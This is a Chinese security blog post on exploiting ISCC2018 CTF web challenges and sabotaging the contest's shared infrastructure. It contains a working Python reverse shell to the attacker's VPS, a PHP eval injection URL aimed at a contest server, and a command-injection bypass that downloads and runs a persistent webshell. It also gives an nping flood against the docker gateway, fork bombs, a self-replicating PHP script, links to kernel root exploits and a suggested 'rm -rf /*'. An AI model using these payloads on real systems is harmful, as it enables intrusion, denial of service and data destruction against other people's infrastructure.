> 原文链接: https://www.anquanke.com//post/id/147989 


# ISCC2018线上赛之Web搅屎


                                阅读量   
                                **174757**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01a18e6255c870769e.jpg)](https://p5.ssl.qhimg.com/t01a18e6255c870769e.jpg)



## 前言

这篇文章主要是总结一下在ISCC中发现的存在漏洞的Web题目，这些漏洞都可以导致题目被搅屎，甚至环境被提权：），当然我在发现的第一时间上报给主办方，至于修不修复就是他们的事情了。虽然说这个比赛的题目大多都是chao的，但是拿来练手刚好。



## 漏洞点

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E4%B8%80"></a>漏洞一

这题题目叫做：php是世界上最好的语言，题目源代码如下：

```
&lt;?php
    include 'flag.php';
    $a = @$_REQUEST['a'];
    @eval("var_dump($$a);");
    show_source(__FILE__);
?&gt;
```

可以看到这里有一个可变变量 `$$a` ，于是想到用 ``{`php代码`}`` 这种方式来执行代码，至于为什么这种方式能够执行代码(客服小哥哥问过我)，参考官方手册吧： [可变变量](http://php.net/manual/zh/language.variables.variable.php)

我发现题目环境装有python，于是打算用python反弹shell（客服在复现的时候直接使用nc发现shell会一直掉，我用python弹的shell就没掉过），代码如下：

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("你的VPSIP",端口号));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

此时先在自己的VPS上面侦听端口：nc -lvp 端口号(和上面python代码里面的端口号一致即可)

把上面的语句用base64加密，放在下面的 `base64_decode('')` 单引号里面，然后访问：

```
http://118.190.152.202:8005/no_md5.php?a=`{`system(base64_decode('cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiYIRWUFNJUCIs7+P3KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn'))`}`
```

访问即可回弹shell[![](https://mochazz.github.io/img/ISCC2018%E6%BC%8F%E6%B4%9E/1.png)](https://mochazz.github.io/img/ISCC2018%E6%BC%8F%E6%B4%9E/1.png)

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E4%BA%8C"></a>漏洞二

这题题目叫做：php是世界上最好的语言，题目源代码如下： 请ping我的ip看你能Ping通吗？

```
&lt;?php
    header("Content-Type:text/html;charset=utf-8");
    echo "请ping我的IP 看你会ping通吗";
    $target = $_REQUEST[ 'ip' ];
    $target=trim($target);
    $substitutions = array(
        '&amp;'  =&gt; '',
        ';' =&gt; '',
        '|' =&gt; '',
        '-'  =&gt; '',
        '$'  =&gt; '',
        '('  =&gt; '',
        ')'  =&gt; '',
        '`'  =&gt; '',
        '||' =&gt; '',
    );
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) `{`
        // Windows

        $cmd = shell_exec( 'ping  ' . $target );
    `}`
    else `{`
        // *nix
        $cmd = shell_exec( 'ping  -c 1 ' . $target );
    `}`
    echo  "&lt;pre&gt;`{`$cmd`}`&lt;/pre&gt;";
?&gt;
```

绕过也很简单，如下：

[![](https://mochazz.github.io/img/ISCC2018%E6%BC%8F%E6%B4%9E/4.png)](https://mochazz.github.io/img/ISCC2018%E6%BC%8F%E6%B4%9E/4.png)

由于题目限制不严格，所以可以直接用wget下载反弹shell程序或者不死马：

```
wget http://VpsIP/iscc.txt
mv iscc.txt .isc.php
chmod +x .isc.php
php .isc.php &amp;
```



## 如何搅屎

由于本次比赛并没有真正去搅屎，下面讨论的方法大多是整理他人的文章或者是在本机测试过的，所以只能算是yiyin搅屎了。

### <a class="reference-link" name="%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"></a>主机发现

linux环境

用shell脚本扫描内网，程序如下：

```
#!/bin/bash
# 用法： ./scan.sh 192.168.199 1 254

network=$1
time=$(date +%H%M%S)

for i in $(seq $2 $3)
do
    ping -c 1 -w 2 $network.$i &gt; /dev/null
    if [ $? -eq 0 ]; then
          arp $network.$i | grep ":" | awk '`{`print $1,$3`}`' &gt;&gt; $time.log
          echo "host $network.$i is up"
   else
          echo "host $network.$i is down"
   fi
done
```

或者使用

```
for ((i=1; i&lt;256; i++));
do
echo "Checking...[$`{`i`}`]"
ping -c 1 192.168.199.$`{`i`}` | grep ttl
done
```

windows环境

主机发现程序如下：

```
for /l %i in (1,1,255) do 
@ping 192.168.1.%i -w 1 -n 1 | find /i "ttl"
```

试着扫了ISCC的内网，扫描出14个IP，应该是14个docker，刚好对应14道Web题目：[![](https://mochazz.github.io/img/ISCC2018%E6%BC%8F%E6%B4%9E/2.png)](https://mochazz.github.io/img/ISCC2018%E6%BC%8F%E6%B4%9E/2.png)

### <a class="reference-link" name="%E6%94%BB%E5%87%BB%E7%BD%91%E5%85%B3"></a>攻击网关

我想着如果要想让所有的web挂掉，那么可以通过攻击网关的方式来达成，因为比赛环境用docker，所以我们可以针对docker网关进行攻击，这样docker内的流量就出不去了，选手也就无法正常访问题目。于是乎我们可以进行arp攻击docker网络，将所有出站流量全部丢弃，或者DOS网关IP，我在ISCC的题目中发现装有nmap，那么我就可以使用命令

```
nping --tcp-connect -rate=90000 -c 900000 -q 172.17.42.1 &amp;
```

### <a class="reference-link" name="%E4%B8%8D%E6%AD%BB%E9%A9%AC"></a>不死马

**基础知识**
<li>1、ignore_user_abort
<pre><code class="lang-php hljs">int ignore_user_abort ([ bool $value ] )
</code></pre>
用于设置客户端断开连接时，是否中断脚本的执行
</li><li>2、set_time_limit
<pre><code class="lang-php hljs">bool set_time_limit ( int $seconds )
</code></pre>
用于设置允许脚本运行的最大时间，单位为秒。如果超过了此设置，脚本返回一个致命的错误。默认值为30秒，或者是在php.ini中 **max_execution_time** 的值。**如果设置为0，没有时间方面的限制。**当此函数被调用时，**set_time_limit()**会从零开始重新启动超时计数器。换句话说，如果超时默认是30秒，在脚本运行了了25秒时调用 **set_time_limit(20)** ，那么脚本在超时之前可运行总时间为45秒。
</li>
```
&lt;?php
    set_time_limit(0);
    ignore_user_abort(true);
    while(1)`{`
        file_put_contents(randstr().'.php',file_get_content(__FILE__));
        file_get_contents("http://127.0.0.1/");
    `}`
?&gt;
```

这个脚本说是执行的后内存爆炸，phpGG了，严重点的话，Docker也GG。但我问过作者，他也没试过，只是夸张的说辞。然后我修改了一些，就在在while的最后一行再把生成的新文件include进来，效果会好一些，但是达到PHP内存上限时，PHP程序会终止运行。

<a class="reference-link" name="%E8%B5%84%E6%BA%90%E8%80%97%E5%B0%BD"></a>**资源耗尽**

linux环境

```
:()`{` :|: &amp; `}`;:
```

[![](https://mochazz.github.io/img/ISCC2018%E6%BC%8F%E6%B4%9E/5.png)](https://mochazz.github.io/img/ISCC2018%E6%BC%8F%E6%B4%9E/5.png)windows环境

```
%0 | %0
```

[![](https://mochazz.github.io/img/ISCC2018%E6%BC%8F%E6%B4%9E/6.png)](https://mochazz.github.io/img/ISCC2018%E6%BC%8F%E6%B4%9E/6.png)

<a class="reference-link" name="%E6%8F%90%E6%9D%83"></a>**提权**

最后想试试提权，一开始用 [CVE-2017-1000112](https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c) 提权失败，然后朋友用 [upstream44.c](https://github.com/jas502n/Ubuntu-0day/blob/master/upstream44.c) 成功提权，如下：

[![](https://mochazz.github.io/img/ISCC2018%E6%BC%8F%E6%B4%9E/3.jpg)](https://mochazz.github.io/img/ISCC2018%E6%BC%8F%E6%B4%9E/3.jpg)

权限大了，你想怎么玩都可以（rm -rf /*）。最后建议大家看一下下面的相关链接，有些内容还是很有趣的，包括youtube上老外耗尽主机资源的视屏以及主办方们的防搅屎思路，都值得借鉴、学习。



## 相关链接

[Trying out some Deadly Linux Commands part 1](https://www.youtube.com/watch?v=kJTWru5nwuk)

[ Cripple a Computer with 5 Bytes of Batch [ %0|%0 ] ](https://www.youtube.com/watch?v=QM6R7kJttSQ)

[论如何在CTF比赛中搅屎](https://www.virzz.com/2017/05/25/how_to_fuck_the_ctf.html)

[CTF主办方指南之对抗搅屎棍](https://www.leavesongs.com/PENETRATION/defense-ctf-cracker.html)

[你所遇到的CTF搅屎棍现象可以有多恶劣？](https://www.zhihu.com/question/40521919)

[AD线下主办方防搅屎之Linux权限记录](https://www.cnblogs.com/iamstudy/articles/build_ad_environment_linux_command.html)

[乌云沙龙：赛棍的自我修养](http://bobao.360.cn/learning/detail/196.html)

[CTF线下赛AWD小结（搬运+整理](https://www.jianshu.com/p/25535f0b98d4)

[CTF 搅屎](https://wangyihang.gitbooks.io/awesome-web-security/content/pentest/ctf-jiao-shi.html)
